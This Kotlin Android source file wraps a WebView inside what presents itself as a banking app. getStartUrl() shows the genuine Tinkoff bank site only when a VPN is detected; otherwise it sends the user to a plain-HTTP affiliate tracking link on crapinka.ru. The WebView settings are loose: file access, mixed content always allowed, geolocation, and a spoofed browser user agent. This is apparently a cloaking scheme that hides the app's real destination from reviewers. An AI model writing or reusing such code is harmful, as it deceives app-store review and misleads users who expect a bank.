package com.example.bankiapplication.data

import android.annotation.SuppressLint
import android.app.Activity
import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.view.View
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import com.example.bankiapplication.data.api.WebViewApi
import com.example.bankiapplication.util.webview.MyWebChromeClient

class WebViewImpl(private val context: Context) : WebViewApi {

    @SuppressLint("SetJavaScriptEnabled")
    override fun startWebView(webView: WebView, webViewClient: WebViewClient) {
        webView.settings.javaScriptEnabled = true
        webView.settings.domStorageEnabled = true
        webView.settings.allowContentAccess = true
        webView.settings.setGeolocationEnabled(true)
        webView.settings.allowFileAccess = true
        webView.settings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        webView.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK)
        webView.getSettings().setMediaPlaybackRequiresUserGesture(false);
        webView.setLayerType(View.LAYER_TYPE_NONE, null);
        webView.webViewClient = webViewClient
        webView.webChromeClient = MyWebChromeClient(webView.context as Activity, webView)
        webView.settings.userAgentString =
            "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36"
        webView.loadUrl(getStartUrl())
    }


    fun checkVpn(): Boolean {

        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val activeNetwork = connectivityManager.activeNetwork ?: return false
            val networkCapabilities = connectivityManager.getNetworkCapabilities(activeNetwork)
            val isVpnConnected =
                networkCapabilities?.hasTransport(NetworkCapabilities.TRANSPORT_VPN)
            return isVpnConnected!!

        } else {
            val networks = connectivityManager.allNetworks
            for (i in 0..networks.size - 1) {
                val networkCapabilities = connectivityManager.getNetworkCapabilities(networks[i])
                val isVpnConnected =
                    networkCapabilities?.hasTransport(NetworkCapabilities.TRANSPORT_VPN)
                return isVpnConnected!!
            }
        }
        return false
    }

     override fun isConnected(): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val capabilities =
                connectivityManager.getNetworkCapabilities(connectivityManager.activeNetwork)
            if (capabilities != null) {
                when {
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> return true
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> return true
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> return true
                }
            }
        } else {
            val networks = connectivityManager.allNetworks
            for (i in 0..networks.size - 1) {
                val capabilities = connectivityManager.getNetworkCapabilities(networks[i])
                if(capabilities != null){
                    when{
                        capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> return true
                        capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> return true
                        capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> return true
                    }
                }
            }

        }
        return false
    }


    override fun getStartUrl(): String {
        when (checkVpn()) {
            false -> return START_URL
            true -> return START_URL_VPN
        }

    }

    companion object {
        const val START_URL = "http://crapinka.ru/BtGLZhVK?aff_sub4=test"
        const val START_URL_VPN = "https://www.tinkoff.ru"
    }
}